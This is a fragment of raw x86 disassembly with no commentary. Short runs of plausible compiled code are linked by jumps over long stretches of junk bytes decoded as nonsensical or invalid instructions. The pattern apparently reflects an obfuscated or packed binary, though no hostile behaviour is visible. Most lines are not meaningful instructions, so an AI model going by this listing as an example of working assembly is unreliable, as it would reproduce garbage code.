  415706:	mov    edx,DWORD PTR [ebp-0x34]
  415709:	add    ecx,0x5ef8
  41570f:	or     ecx,edx
  415711:	sub    ecx,0xbefe
  415717:	cmp    eax,ecx
  415719:	jne    0x415e00
  41571f:	mov    eax,DWORD PTR [ebp-0x54]
  415722:	jmp    0x4157ed
  415727:	or     DWORD PTR [edi],esi
  415729:	push   edx
  41572a:	xchg   ecx,eax
  41572b:	jle    0x415722
  41572d:	retf   
  41572e:	mov    edi,0x9554104e
  415733:	hlt    
  415734:	in     al,dx
  415735:	adc    ebx,DWORD PTR [ecx-0x49]
  415738:	icebp  
  415739:	add    BYTE PTR [eax],al
  41573b:	scas   al,BYTE PTR es:[edi]
  41573c:	add    BYTE PTR [eax],al
  41573e:	add    BYTE PTR [eax],ah
  415740:	pop    esp
  415741:	outs   dx,BYTE PTR ds:[esi]
  415742:	mov    ds:0x550d63d3,eax
  415747:	inc    edx
  415748:	jbe    0x4156f4
  41574a:	jbe    0x41573b
  41574c:	int3   
  41574d:	and    edi,eax
  41574f:	pop    edx
  415750:	arpl   WORD PTR [ebx+0x10614c0d],cx
  415756:	push   0x80513427
  41575b:	push   ds
  41575c:	and    al,bh
  41575e:	adc    eax,0xa8f80e1f
  415763:	into   
  415764:	leave  
  415765:	nop    DWORD PTR [ebx-0x11]
  415769:	sbb    dl,BYTE PTR [edx+edx*4]
  41576c:	cmp    bh,BYTE PTR [ebp-0x7e]
  41576f:	retf   
  415770:	pop    ebp
  415771:	(bad)  
  415772:	cmp    eax,0x9a90b7c
  415777:	pop    ds
  415778:	retf   
  415779:	retf   
  41577a:	pop    eax
  41577b:	fst    QWORD PTR [ebx+0x396111e1]
  415781:	sub    eax,eax
  415783:	add    al,0xd1
  415785:	ret    
  415786:	jns    0x415757
  415788:	xor    eax,0x13fe9237
  41578d:	js     0x4157f0
  41578f:	cmp    esi,esi
  415791:	pop    edi
  415792:	aam    0xe7
  415794:	mov    ds:0x120e7209,eax
  415799:	fisubr DWORD PTR [ecx]
  41579b:	fidiv  WORD PTR [edi+ebx*8+0x62f0cd18]
  4157a2:	cwde   
  4157a3:	sub    eax,0x959be807
  4157a8:	sub    al,0xe7
  4157aa:	pop    ebp
  4157ab:	arpl   WORD PTR [edx],ax
  4157ad:	sub    cl,BYTE PTR [esi-0x38]
  4157b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157b1:	sbb    ecx,eax
  4157b3:	jmp    eax
  4157b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157b6:	jbe    0x4157fb
  4157b8:	cs pop ds
  4157ba:	daa    
  4157bb:	aas    
  4157bc:	xor    DWORD PTR [eax+0x37900276],esp
  4157c2:	xchg   ch,bl
  4157c4:	sub    bh,cl
  4157c6:	(bad)  
  4157c8:	jne    0x415828
  4157ca:	iret   
  4157cb:	(bad)  
  4157cc:	pusha  
  4157cd:	mov    eax,0x73ff0c41
  4157d2:	aas    
  4157d3:	mov    ebp,0xd738d4e5
  4157d8:	arpl   WORD PTR [esi+0x4c5b6048],di
  4157de:	jl     0x41585e
  4157e0:	and    BYTE PTR [edx-0x31dcba70],dl
  4157e6:	ins    DWORD PTR es:[edi],dx
  4157e7:	inc    eax
  4157e8:	div    DWORD PTR [ecx-0x74698dd3]
  4157ee:	dec    ebp
  4157ef:	nop
  4157f0:	imul   eax,eax,0x1e96
  4157f6:	xor    eax,ecx
  4157f8:	and    eax,0x3e8d
  4157fd:	add    eax,DWORD PTR [ebp-0x5c]
  415800:	jmp    0x4158cb
  415805:	push   ds
  415806:	and    al,0x80
  415808:	xchg   ecx,eax
  415809:	mov    edx,0x78af1fb5
  41580e:	dec    eax
  41580f:	int    0xcd
  415811:	arpl   WORD PTR [esi-0x3c],sp
  415814:	int    0x65
  415816:	repnz add BYTE PTR [eax],al
  415819:	scas   al,BYTE PTR es:[edi]
  41581a:	add    BYTE PTR [eax],al
  41581c:	add    BYTE PTR [ecx+ebp*8-0x2f],cl
  415820:	sub    DWORD PTR [edx],0x3a
  415823:	jo     0x415805
  415825:	shr    BYTE PTR [edx-0xe],0xd
  415829:	mov    ds:0xe739bb84,eax
  41582e:	xchg   ecx,eax
  41582f:	add    bh,BYTE PTR [ecx+ebp*2+0x2d]
  415833:	test   al,0xfa
  415835:	dec    ebx
  415836:	add    DWORD PTR [ecx],esi
  415838:	lds    eax,FWORD PTR [eax-0x43]
  41583b:	test   BYTE PTR [edx+0xd],dh
  41583e:	not    DWORD PTR [edi+0x7b]
  415841:	push   ds
  415842:	jo     0x4157ed
  415844:	in     eax,0x2f
  415846:	mov    al,0xff
  415848:	xor    ebx,ebp
  41584a:	ret    
  41584b:	out    dx,eax
  41584c:	adc    esi,DWORD PTR [ebp+0x6225c137]
  415852:	or     eax,0x449501de
  415857:	in     al,0x9d
  415859:	sbb    al,0xac
  41585b:	sti    
  41585c:	(bad)  
  41585e:	call   0x4847:0x9131f489
  415865:	je     0x4157ef
  415867:	jecxz  0x4158d2
  415869:	pop    ebx
  41586a:	(bad)  
  41586b:	not    edi
  41586d:	push   ecx
  41586e:	jb     0x415831
  415870:	jmp    0xecd4:0x133554d9
  415877:	fwait
  415878:	dec    edx
  415879:	jmp    0x72e4:0x289e43ba
  415880:	jns    0x415868
  415882:	mov    edi,0x2c363ece
  415887:	mov    cl,0xa2
  415889:	(bad)  
  41588a:	sahf   
  41588b:	ret    
  41588c:	push   ebx
  41588d:	ds inc esi
  41588f:	push   0xda030aee
  415894:	or     BYTE PTR [ecx],al
  415896:	test   BYTE PTR [esp+eax*8-0x86507f5],bh
  41589d:	and    BYTE PTR [edi+0x16],bh
  4158a0:	out    0x66,eax
  4158a2:	ja     0x4158a5
  4158a4:	cdq    
  4158a5:	ins    DWORD PTR es:[edi],dx
  4158a6:	pop    eax
  4158a7:	es popf 
  4158a9:	jbe    0x4158c5
  4158ab:	pop    edi
  4158ac:	popf   
  4158ad:	jmp    0xdf4efc94
  4158b2:	shl    DWORD PTR [ebp-0x2097c878],0x37
  4158b9:	es (bad) 
  4158bb:	jmp    0xb7e9:0x5b23c519
  4158c2:	dec    ecx
  4158c3:	(bad)  
  4158c4:	aas    
  4158c5:	gs pop ecx
  4158c7:	inc    eax
  4158c8:	push   0xd233b342
  4158cd:	xor    eax,0x42e3
  4158d2:	lea    eax,[ebp+eax*1-0xd0]
  4158d9:	jmp    0x4159a4
  4158de:	sub    ebx,DWORD PTR [ebx]
  4158e0:	lea    esp,[ebp-0x43]
  4158e3:	imul   ebx
  4158e5:	pop    edi
  4158e6:	jl     0x4158cf
  4158e8:	fnstsw WORD PTR [edi+0x1cf5a0cd]
  4158ee:	adc    esi,ebx
  4158f0:	add    BYTE PTR [eax],al
  4158f2:	scas   al,BYTE PTR es:[edi]
  4158f3:	add    BYTE PTR [eax],al
  4158f5:	add    BYTE PTR [esi],bh
  4158f7:	lock or cl,dl
  4158fa:	sub    eax,0x2b744dcc
  4158ff:	inc    esi
  415900:	popa   
  415901:	sub    al,0x5c
  415903:	inc    eax
  415904:	out    0xde,eax
  415906:	push   es
  415907:	(bad)
  41590a:	(bad)  
  41590b:	pop    edi
  41590c:	mov    WORD PTR [esi+edi*4],?
  41590f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415910:	mov    edi,0x9bd905ee
  415915:	scas   al,BYTE PTR es:[edi]
  415916:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415917:	and    al,0x48
  415919:	mov    cl,bh
  41591b:	outs   dx,DWORD PTR ds:[esi]
  41591c:	pop    edi
  41591d:	stc    
  41591e:	(bad)  
  41591f:	jmp    0xbc25779e
  415924:	mov    edx,0x7e8c952d
  415929:	mov    ch,0xf6
  41592b:	push   esp
  41592c:	ins    BYTE PTR es:[edi],dx
  41592d:	cmp    al,BYTE PTR [edx+0x6431c251]
  415933:	sbb    al,0x3c
  415935:	or     ah,BYTE PTR [ecx]
  415937:	dec    DWORD PTR [eax-0x36b64762]
  41593d:	mov    eax,ds:0x750b962a
  415942:	scas   al,BYTE PTR es:[edi]
  415943:	ds test al,0x2b
  415947:	xchg   ebp,eax
  415948:	mov    ds:0xc35cd50,eax
  41594d:	adc    ch,dh
  41594f:	aam    0x2f
  415951:	das    
  415952:	lods   eax,DWORD PTR ds:[esi]
  415953:	jge    0x415917
  415955:	pop    ss
  415956:	sbb    al,0x4e
  415958:	ja     0x415973
  41595a:	and    ch,BYTE PTR [esi+0x7]
  41595d:	adc    ah,dh
  41595f:	xor    eax,0x922513e3
  415964:	dec    ebp
  415965:	dec    esi
  415966:	jns    0x4159dc
  415968:	mov    ecx,0x743fd2d1
  41596d:	sub    DWORD PTR [ecx-0x41cfbe0d],0xfffffffd
  415974:	outs   dx,BYTE PTR ds:[esi]
  415975:	scas   al,BYTE PTR es:[edi]
  415976:	push   edx
  415977:	jb     0x415985
  415979:	jno    0x4159a9
  41597b:	and    al,0x5f
  41597d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41597e:	dec    esi
  41597f:	add    BYTE PTR [esi-0x5414a23c],0x57
  415986:	call   edi
  415988:	mov    ah,0x7b
  41598a:	jge    0x4159cf
  41598c:	push   ecx
  41598d:	sub    al,0xff
  41598f:	xchg   ch,bh
  415991:	retf   0x2a08
  415994:	fadd   QWORD PTR [esi+0x326b095a]
  41599a:	push   ecx
  41599b:	push   ds
  41599c:	sbb    eax,DWORD PTR [ebx+0x9]
  41599f:	mov    edi,edi
  4159a1:	sub    cl,BYTE PTR [esi]
  4159a3:	out    dx,al
  4159a4:	push   eax
  4159a5:	mov    eax,DWORD PTR [ebp-0x7c]
  4159a8:	jmp    0x415a73
  4159ad:	push   esi
  4159ae:	and    eax,0xeff76fa5
  4159b3:	fidivr WORD PTR ds:0x5f3932a4
  4159b9:	loopne 0x415983
  4159bb:	clc    
  4159bc:	(bad)
  4159c0:	add    BYTE PTR [esi+0x57000000],ch
  4159c6:	jmp    0x66886c55
  4159cb:	jae    0x415a2b
  4159cd:	in     eax,dx
  4159ce:	call   0xe27a:0xbb028295
  4159d5:	and    BYTE PTR [eax-0x70],0xf0
  4159d9:	loopne 0x415970
  4159db:	mov    esp,0xdb8246a0
  4159e0:	dec    ebp
  4159e1:	stos   DWORD PTR es:[edi],eax
  4159e2:	fsubr  st,st(5)
  4159e4:	mov    esp,0x2400d7e3
  4159ea:	mov    ah,0x7d
  4159ec:	sub    BYTE PTR [esi+0x1d],0x22
  4159f0:	mov    edi,esp
  4159f2:	mov    esi,DWORD PTR [esi]
  4159f4:	adc    ecx,edi
  4159f6:	(bad)  
  4159f8:	push   eax
  4159f9:	sbb    edx,DWORD PTR [edi]
  4159fb:	xor    ebx,DWORD PTR [edx+0x6d]
  4159fe:	add    esp,DWORD PTR [ebx+eax*1]
  415a01:	jno    0x4159ab
  415a03:	inc    edi
  415a04:	aas    
  415a05:	pop    edx
  415a06:	test   al,0x96
  415a08:	repnz mov bh,0xc9
  415a0b:	add    al,0x8c
  415a0d:	das    
  415a0e:	fcomi  st,st(0)
  415a10:	and    eax,0xf9105ad8
  415a15:	in     eax,dx
  415a16:	cwde   
  415a17:	or     bl,BYTE PTR [edi-0x70]
  415a1a:	jl     0x4159a9
  415a1c:	rol    DWORD PTR [edx],0x5e
  415a1f:	jmp    0x9f24:0x2d1a04ae
  415a26:	ss or  bh,dh
  415a29:	test   eax,0x6af03427
  415a2e:	mov    eax,0xfc991e6
  415a33:	sbb    DWORD PTR [edi+0x33afd390],edi
  415a39:	stos   BYTE PTR es:[edi],al
  415a3a:	jno    0x4159d6
  415a3c:	fdiv   QWORD PTR [edx]
  415a3e:	jge    0x4159e1
  415a40:	daa    
  415a41:	arpl   WORD PTR [esi],bx
  415a43:	push   ebp
  415a44:	adc    al,0x37
  415a46:	mov    BYTE PTR [edi+ebx*2-0x29],dh
  415a4a:	gs hlt 
  415a4c:	mov    dl,0xa4
  415a4e:	jns    0x415a6a
  415a50:	mov    al,0xbe
  415a52:	xor    al,0xf0
  415a54:	mov    dl,0xa8
  415a56:	mov    eax,ds:0x3ffd2648
  415a5b:	nop
  415a5c:	pop    ebx
  415a5d:	sysexit 
  415a5f:	into   
  415a60:	sub    al,0x94
  415a62:	push   0x72
  415a64:	or     bl,ah
  415a66:	bound  ebx,QWORD PTR [edi-0x7920c16d]
  415a6c:	fcomp  DWORD PTR [ebx]
  415a6e:	lods   eax,DWORD PTR ds:[esi]
  415a6f:	xchg   ebp,ebp
  415a71:	not    DWORD PTR [edi-0x75]
  415a74:	dec    ebp
  415a75:	enter  0xc133,0x8b
  415a79:	dec    ebp
  415a7a:	shl    BYTE PTR ds:0x2df8,0x33
  415a81:	ror    DWORD PTR [ebx-0x50f047b3],0xc1
  415a88:	xor    eax,0x23a0d229
  415a8d:	jmp    0x415b58
  415a92:	pop    ss
  415a93:	and    al,BYTE PTR [edi]
  415a95:	div    BYTE PTR [edi]
  415a97:	div    edi
  415a99:	jecxz  0x415af4
  415a9b:	loope  0x415b09
  415a9d:	dec    esi
  415a9e:	test   BYTE PTR [eax],bl
  415aa0:	fistp  QWORD PTR [eax]
  415aa2:	outs   dx,DWORD PTR ds:[esi]
  415aa3:	hlt    
  415aa4:	add    BYTE PTR [eax],al
  415aa6:	scas   al,BYTE PTR es:[edi]
  415aa7:	add    BYTE PTR [eax],al
  415aa9:	add    BYTE PTR [ecx+0x28d4e56c],bl
  415aaf:	pop    es
  415ab0:	fs out dx,al
  415ab2:	mov    esi,0x9332e30b
  415ab7:	adc    al,0x9
  415ab9:	enter  0x8964,0xe1
  415abd:	mov    esp,0x1d1c8300
  415ac2:	mov    bl,0x53
  415ac4:	push   0x7b
  415ac6:	out    0xc,al
  415ac8:	xchg   ebp,eax
  415ac9:	and    esp,0x1ee8f6c1
  415acf:	lock lds eax,FWORD PTR [eax]
  415ad2:	xchg   esp,eax
  415ad3:	lds    ebx,FWORD PTR [ebp-0x1a]
  415ad6:	jp     0x415acc
  415ad8:	retf   
  415ad9:	enter  0x84e9,0x6b
  415add:	push   0xffffff9e
  415adf:	xor    al,0x58
  415ae1:	out    dx,ax
  415ae3:	mov    esi,0xa6e2f257
  415ae8:	push   0x4
  415aea:	adc    BYTE PTR [ebp+0x73],bl
  415aed:	stos   BYTE PTR es:[edi],al
  415aee:	push   0x8617bf3
  415af3:	add    al,0xc2
  415af6:	nop
  415af7:	push   ebp
  415af8:	hlt    
  415af9:	or     BYTE PTR [esi],bl
  415afb:	sbb    esp,DWORD PTR [edi]
  415afd:	jg     0x415afc
  415aff:	jnp    0x415ad4
  415b01:	sbb    edx,DWORD PTR [eax-0x5d]
  415b04:	cmp    edx,DWORD PTR cs:[edx-0x4f]
  415b08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b09:	xchg   ecx,eax
  415b0a:	sbb    esp,DWORD PTR [edx+0x3215fe8a]
  415b10:	xchg   ecx,eax
  415b11:	frstor [ebx-0x7db6998d]
  415b17:	jb     0x415acb
  415b19:	sbb    eax,0xdeaa2522
  415b1e:	(bad)  
  415b1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b20:	add    eax,0xca6cf623
  415b25:	or     eax,0x222dcade
  415b2a:	pop    es
  415b2b:	daa    
  415b2c:	jle    0x415b8d
  415b2e:	push   esi
  415b2f:	ret    0x1c5d
  415b32:	pushf  
  415b33:	jl     0x415abb
  415b35:	(bad)  
  415b37:	push   esi
  415b38:	xor    al,0xa1
  415b3a:	por    mm4,QWORD PTR [ebp-0x3cc4b329]
  415b41:	dec    esp
  415b42:	dec    edi
  415b43:	add    BYTE PTR [esi],dl
  415b45:	mov    al,0xfe
  415b47:	xchg   edi,eax
  415b48:	xor    eax,0x19b3ed0d
  415b4d:	mov    ebp,0xfe9a564e
  415b52:	adc    BYTE PTR [ebx],0x99
  415b55:	loopne 0x415b34
  415b57:	ficom  DWORD PTR [eax-0x5f]
  415b5a:	mov    ah,0xf1
  415b5c:	inc    edx
  415b5d:	add    cl,ch
  415b5f:	mov    BYTE PTR [eax],0x0
  415b62:	add    BYTE PTR [ecx-0x76],bl
  415b65:	push   0xfffffff1
  415b67:	sti    
  415b68:	icebp  
  415b69:	fld    TBYTE PTR [edx-0x5ea427c7]
  415b6f:	jb     0x415b20
  415b71:	loopne 0x415b40
  415b73:	sbb    eax,0xae0000f5
  415b78:	add    BYTE PTR [eax],al
  415b7a:	add    BYTE PTR ds:0xb183e9d3,al
  415b80:	call   0xbd95395a
  415b85:	inc    ebx
  415b86:	pop    esi
  415b87:	or     edx,eax
  415b89:	dec    edi
  415b8a:	lds    eax,FWORD PTR [ebx+0x55]
  415b8d:	(bad)  
  415b8e:	mov    cl,0x45
  415b90:	add    DWORD PTR [edi+0x1f],ecx
  415b93:	into   
  415b94:	cmp    ch,cl
  415b96:	mov    esp,0x75464b4c
  415b9b:	shl    al,1
  415b9d:	jge    0x415b41
  415b9f:	lods   al,BYTE PTR ds:[esi]
  415ba0:	ror    DWORD PTR [ebp+0x6d576ce5],cl
  415ba6:	sbb    DWORD PTR [eax],0xc48bb3eb
  415bac:	into   
  415bad:	or     eax,0xd3ce97c
  415bb2:	adc    eax,0x97806347
  415bb7:	adc    ah,cl
  415bb9:	xchg   esp,eax
  415bba:	sbb    esi,ebx
  415bbc:	inc    esi
  415bbd:	mov    ebx,0x22447818
  415bc2:	test   DWORD PTR [ebx],edi
  415bc4:	adc    ecx,DWORD PTR [esi+esi*2-0x6b]
  415bc8:	mov    esi,0x4e3a7ba9
  415bcd:	test   BYTE PTR [eax-0x4f3db7ea],bh
  415bd3:	mov    al,ds:0x30fa86b8
  415bd8:	mov    eax,0xec37ad9d
  415bdd:	sub    eax,0x385135a
  415be2:	pop    ss
  415be3:	adc    ch,BYTE PTR [eax+0x62c34e0d]
  415be9:	adc    bh,al
  415beb:	adc    al,0x65
  415bed:	xchg   edx,eax
  415bee:	dec    esp
  415bef:	je     0x415bb0
  415bf1:	ret    0x8498
  415bf4:	pop    es
  415bf5:	xchg   ecx,eax
  415bf6:	sahf   
  415bf7:	xchg   esi,eax
  415bf8:	dec    ebp
  415bf9:	mov    ecx,0x95f86265
  415bfe:	in     eax,dx
  415bff:	test   cl,0x0
  415c02:	repz in eax,dx
  415c04:	or     BYTE PTR [ebx+esi*4+0x256cc52d],cl
  415c0b:	pop    ebx
  415c0c:	sub    BYTE PTR [ebp+0x4b58dc7b],al
  415c12:	mov    dh,0x62
  415c14:	ror    dl,1
  415c16:	pop    ebx
  415c17:	jmp    0x415c38
  415c19:	mov    al,ds:0x9fc200a3
  415c1e:	mov    ds,ebp
  415c20:	mov    BYTE PTR [eax-0x26],dh
  415c23:	jns    0x415c8c
  415c25:	shr    DWORD PTR [ecx],cl
  415c27:	out    0xf6,al
  415c29:	add    eax,0xaa
  415c2e:	push   eax
  415c2f:	mov    eax,DWORD PTR [ebp-0x2c]
  415c32:	imul   eax,eax,0x1495
  415c38:	mov    ecx,0x10b24
  415c3d:	div    ecx
  415c3f:	mov    ecx,DWORD PTR [ebp-0x24]
  415c42:	xor    edx,edx
  415c44:	jmp    0x415d0f
  415c49:	cmp    BYTE PTR [ebx],0xb6
  415c4c:	fistp  QWORD PTR [edi+0x27febdf]
  415c52:	jmp    0x415c6f
  415c54:	ret    
  415c55:	es pop edi
  415c57:	sbb    ah,BYTE PTR [ebp+0xf5cb]
  415c5d:	scas   al,BYTE PTR es:[edi]
  415c5e:	add    BYTE PTR [eax],al
  415c60:	add    BYTE PTR [esi+0x1d],ch
  415c63:	ss mov cl,0x75
  415c66:	add    DWORD PTR [edi-0x26],0x30
  415c6a:	out    dx,al
  415c6b:	and    eax,0x3da6a929
  415c70:	pusha  
  415c71:	rcl    al,cl
  415c73:	repz rcr al,cl
  415c76:	dec    esi
  415c77:	jecxz  0x415ca6
  415c79:	shl    DWORD PTR [ebx+edi*4],0xd9
  415c7d:	pushf  
  415c7e:	or     ebp,DWORD PTR [edx]
  415c80:	sbb    al,0xf3
  415c82:	pop    eax
  415c83:	jecxz  0x415c87
  415c85:	xchg   ebp,eax
  415c86:	jecxz  0x415cff
  415c88:	dec    esp
  415c89:	pop    eax
  415c8a:	push   eax
  415c8b:	outs   dx,BYTE PTR ds:[esi]
  415c8c:	cwde   
  415c8d:	addr16 inc edi
  415c8f:	sbb    bl,BYTE PTR [edi+ebx*1]
  415c92:	mov    esi,0xce6d196e
  415c97:	div    BYTE PTR [edx+0x1b]
  415c9a:	cmp    al,0xf9
  415c9c:	cwde   
  415c9d:	(bad)  
  415c9e:	ret    0x5c83
  415ca1:	xor    edi,ecx
  415ca3:	pushf  
  415ca4:	cmc    
  415ca5:	mov    dl,0xfd
  415ca7:	sbb    BYTE PTR [esi+0x336d5c7e],0x93
  415cae:	loopne 0x415cbc
  415cb0:	imul   DWORD PTR [esp+ebx*8]
  415cb3:	push   ecx
  415cb4:	jo     0x415c41
  415cb6:	je     0x415c7e
  415cb8:	and    BYTE PTR [eax+0x46],cl
  415cbb:	aaa    
  415cbc:	pop    es
  415cbd:	push   cs
  415cbe:	fs sti 
  415cc0:	xor    DWORD PTR [esi+ebx*8],ebp
  415cc3:	lea    edx,cs:[eax]
  415cc6:	pop    esi
  415cc7:	bound  ebp,QWORD PTR [esi]
  415cc9:	fadd   DWORD PTR [edi+0xc041a]
  415ccf:	test   al,0xed
  415cd1:	bound  ebp,QWORD PTR [ebx+0x37b863bc]
  415cd7:	add    DWORD PTR es:[ebp+0x2f49c5f8],edi
  415cde:	mov    ah,dh
  415ce0:	repz inc esp
  415ce2:	push   es
  415ce3:	ret    0x2c53
  415ce6:	shr    BYTE PTR ds:0xb1d6804d,cl
  415cec:	xchg   BYTE PTR [edi],ch
  415cee:	sti    
  415cef:	mov    esi,0x13d4e946
  415cf4:	inc    eax
  415cf5:	xor    al,0xe6
  415cf7:	xor    esi,DWORD PTR [ebx-0x7a]
  415cfa:	pushf  
  415cfb:	in     al,0x4a
  415cfd:	call   0x6eed:0x1974c7b6
  415d04:	jae    0x415caa
  415d06:	push   cs
  415d07:	out    0x4d,al
  415d09:	and    eax,0x328a4b58
  415d0e:	mov    bh,0xf
  415d10:	scas   eax,DWORD PTR es:[edi]
  415d11:	sar    DWORD PTR [ecx+0x69e],0xe9
  415d18:	mov    BYTE PTR [eax],0x0
  415d1b:	add    BYTE PTR [edi-0x413d73c3],cl
  415d21:	repz iret 
  415d23:	jge    0x415d3d
  415d25:	loope  0x415ced
  415d27:	dec    esi
  415d28:	dec    eax
  415d29:	scas   eax,DWORD PTR es:[edi]
  415d2a:	aad    0xa5
  415d2c:	jns    0x415d24
  415d2e:	add    BYTE PTR [eax],al
  415d30:	scas   al,BYTE PTR es:[edi]
  415d31:	add    BYTE PTR [eax],al
  415d33:	add    BYTE PTR [ecx],bl
  415d35:	sub    eax,0x8361e23e
  415d3a:	test   BYTE PTR [ecx],0x72
  415d3d:	out    0xb9,eax
  415d3f:	in     eax,0x9c
  415d41:	mov    eax,ds:0x5cf3f8ca
  415d46:	scas   eax,DWORD PTR es:[edi]
  415d47:	loope  0x415db7
  415d49:	out    0x6,eax
  415d4b:	jp     0x415d6c
  415d4d:	jmp    0xd2f7:0x86ae3526
  415d54:	cwde   
  415d55:	lods   al,BYTE PTR ds:[esi]
  415d56:	ror    DWORD PTR [eax-0x474205ee],1
  415d5c:	lods   al,BYTE PTR ds:[esi]
  415d5d:	push   esp
  415d5e:	jmp    0x7e258653
  415d63:	sbb    ebx,esp
  415d65:	loope  0x415d0c
  415d67:	push   ebp
  415d68:	mov    ecx,0x6909dfbe
  415d6d:	loop   0x415d22
  415d6f:	mov    esp,0x2045e937
  415d74:	or     bl,BYTE PTR [edi+0x3a0cbe5c]
  415d7a:	push   esi
  415d7b:	call   0x167d:0xa34d30b1
  415d82:	mov    esi,0x52f6fd8d
  415d87:	push   edx
  415d88:	shl    DWORD PTR [esi+edi*2-0x18],1
  415d8c:	pop    edx
  415d8d:	les    ebx,FWORD PTR [ebx+0x30]
  415d90:	mov    DWORD PTR [ebp-0x2b1fd9ed],edx
  415d96:	sub    al,0xc
  415d98:	rcl    DWORD PTR [edx+0x1449cd8],1
  415d9e:	or     dl,al
  415da0:	and    DWORD PTR [edx-0x1cc29144],0x30
  415da7:	and    eax,DWORD PTR [ebx-0x25]
  415daa:	cld    
  415dab:	lods   eax,DWORD PTR ds:[esi]
  415dac:	es movups xmm1,xmm1
  415db0:	mov    bl,0xe
  415db2:	imul   esp,DWORD PTR [eax-0x37],0x7defe489
  415db9:	cmp    BYTE PTR es:[ebx-0x71998a5e],ch
  415dc0:	neg    DWORD PTR [edi+0xbd245ae]
  415dc6:	or     BYTE PTR [ebx+ebp*1-0x76],ah
  415dca:	and    al,0x1a
  415dcc:	pop    ebx
  415dcd:	and    bl,BYTE PTR [edi-0x4695f5b6]
  415dd3:	mov    esi,0x91a8f83a
  415dd8:	rcl    BYTE PTR [esi+0x1d081541],cl
  415dde:	pop    esp
  415ddf:	pop    eax
  415de0:	loope  0x415de3
  415de2:	div    ecx
  415de4:	mov    ecx,DWORD PTR ds:0x42f1b4
  415dea:	mov    ecx,DWORD PTR [ecx+0x198]
  415df0:	sub    ecx,eax
  415df2:	push   DWORD PTR [ecx+0x72d2]
  415df8:	call   0x40d6b3
  415dfd:	mov    DWORD PTR [ebp-0x4],eax
  415e00:	mov    ecx,DWORD PTR ds:0x42f2ac
  415e06:	lea    eax,[ebp+0x4]
  415e09:	mov    DWORD PTR [ecx*4+0x42f2a4],eax
  415e10:	inc    DWORD PTR ds:0x42f2ac
  415e16:	jmp    0x415ee1
  415e1b:	pop    es
  415e1c:	jmp    0x415dc7
  415e1e:	ins    DWORD PTR es:[edi],dx
  415e1f:	in     eax,dx
  415e20:	outs   dx,DWORD PTR ds:[esi]
  415e21:	(bad)  
  415e22:	jmp    0x415e3b
  415e24:	pop    ebp
  415e25:	adc    esi,DWORD PTR [ebx]
  415e27:	xchg   DWORD PTR [eax],edi
  415e29:	mov    ebp,0xf727a1
  415e2e:	add    BYTE PTR [esi-0x55000000],ch
  415e34:	lds    esp,FWORD PTR [eax+0x34]
  415e37:	repnz xor al,0x3c
  415e3a:	mov    ebx,ecx
  415e3c:	adc    eax,0xe0784e35
  415e41:	jae    0x415dda
  415e43:	pushf  
  415e44:	loop   0x415dd6
  415e46:	in     al,0xcd
  415e48:	adc    BYTE PTR [ebx],dl
  415e4a:	jecxz  0x415e96
  415e4c:	loope  0x415ecb
  415e4e:	fucomp st(4)
  415e50:	xchg   DWORD PTR [ebx+0x1fbb1876],ebp
  415e56:	xchg   DWORD PTR [edx+0x2e],esp
  415e59:	cmp    BYTE PTR [ebx-0x5e71c114],bh
  415e5f:	mov    eax,ds:0x2b9751f2
  415e64:	pop    ss
  415e65:	clc    
  415e66:	pop    edx
  415e67:	dec    ebx
  415e68:	mov    edx,0x4968cdba
  415e6d:	dec    ebp
  415e6e:	dec    esi
  415e6f:	add    al,0x73
  415e71:	xor    eax,0x9dfb99fc
  415e76:	leave  
  415e77:	call   0x8796:0xb6312105
  415e7e:	fwait
  415e7f:	adc    DWORD PTR [ebx+eiz*2],ebx
  415e82:	out    0x9b,al
  415e84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e85:	mov    ds:0x9880e523,al
  415e8a:	out    0xf,al
  415e8c:	mov    eax,0xa1bbbb9c
  415e91:	in     al,dx
  415e92:	push   edi
  415e93:	push   eax
  415e94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e95:	fstp   QWORD PTR [ecx]
  415e97:	rcr    BYTE PTR [ebp+0x4f753dfd],1
  415e9d:	jmp    0x292577b3
  415ea2:	add    eax,0x959c29e0
  415ea7:	add    BYTE PTR [edx+eax*4],ch
  415eaa:	dec    esp
  415eab:	stos   BYTE PTR es:[edi],al
  415eac:	ror    DWORD PTR [ecx-0x10b9a53e],1
  415eb2:	in     al,0xbd
  415eb4:	sbb    BYTE PTR [ecx],ch
  415eb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415eb7:	jo     0x415eb1
  415eb9:	pushf  
  415eba:	mov    ds:0x5f1186b4,eax
  415ebf:	and    BYTE PTR [esi],0x5f
  415ec2:	xor    esi,DWORD PTR [edi-0x23]
  415ec5:	loop   0x415eff
  415ec7:	cmp    al,0x80
  415ec9:	fisub  DWORD PTR [esp+eiz*2+0x7a]
  415ecd:	adc    ebp,DWORD PTR [esi+0x6f7cec6f]
  415ed3:	xor    bl,bh
  415ed5:	into   
  415ed6:	(bad)  
  415ed7:	(bad)  
  415ed8:	inc    DWORD PTR [esi]
  415eda:	stc    
  415edb:	mov    ah,0xe7
  415edd:	inc    edx
  415ede:	add    ecx,DWORD PTR [ebp+0x20]
  415ee1:	mov    eax,DWORD PTR [ebp-0x4]
  415ee4:	jmp    0x415faf
  415ee9:	pop    es
  415eea:	ds add ah,bh
  415eed:	cmp    edi,edi
  415eef:	out    0xfe,eax
  415ef1:	into   
  415ef2:	xor    cl,BYTE PTR [eax+0x4eaec7da]
  415ef8:	int    0xd5
  415efa:	test   DWORD PTR [eax],0xae00
  415f00:	add    BYTE PTR [esp+eax*2-0x1a],ch
  415f04:	add    bh,BYTE PTR [esi+0x399c9ef]
  415f0a:	fnsetpm(287 only) 
  415f0c:	xor    DWORD PTR [edi],ecx
  415f0e:	jbe    0x415ebb
  415f10:	and    BYTE PTR [ecx-0x55448fd9],cl
  415f16:	add    ebp,DWORD PTR [ebx-0x1d]
  415f19:	sbb    bl,cl
  415f1b:	jnp    0x415f5f
  415f1d:	mov    dh,0x57
  415f1f:	mov    cl,0x38
  415f21:	sahf   
  415f22:	sub    BYTE PTR [ebp-0x61],0x7d
